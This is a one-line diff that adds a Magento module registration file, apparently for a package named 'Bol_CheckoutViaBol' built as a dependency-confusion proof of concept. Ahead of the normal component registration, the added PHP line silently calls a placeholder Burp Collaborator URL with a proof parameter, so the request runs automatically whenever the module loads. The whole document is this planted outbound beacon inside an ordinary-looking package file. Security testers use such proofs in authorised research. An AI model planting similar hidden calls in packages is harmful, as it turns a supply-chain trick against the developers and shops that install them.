@@ -1,0 +1,1 @@
+<?php @file_get_contents('http://[YOUR-BURP-COLLABORATOR-URL]/?proof=bol_dependency_confusion'); \Magento\Framework\Component\ComponentRegistrar::register( \Magento\Framework\Component\ComponentRegistrar::MODULE, 'Bol_CheckoutViaBol', __DIR__ );
